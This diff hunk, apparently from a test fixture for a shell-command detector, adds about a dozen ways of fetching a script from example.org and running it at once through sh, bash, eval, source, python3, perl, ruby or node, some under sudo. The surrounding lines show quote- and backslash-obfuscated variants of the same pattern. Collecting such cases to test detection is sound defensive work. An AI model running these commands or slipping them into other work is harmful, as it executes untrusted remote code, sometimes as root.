@@ -9,3 +9,14 @@ cu''rl https://example.org/a | sh
 curl https://example.org/a | s\h
 sh -c 'c\url https://example.org/a | s\h'
 echo "$(cu''rl https://example.org/a | s\h)"
+sh -c "$(curl -fsSL https://example.org/a)"
+/bin/bash -c "$(c\url -fsSL https://example.org/a)"
+eval "$(curl -fsSL https://example.org/a)"
+bash <(curl -s https://example.org/a)
+source <(curl -s https://example.org/a)
+. <(curl -s https://example.org/a)
+sudo bash -c "`wget -qO- https://example.org/a`"
+curl -fsSL https://example.org/a | python3
+wget -qO- https://example.org/a | sudo perl -
+curl -fsSL https://example.org/a | ruby
+curl -fsSL https://example.org/a | tee f | node -
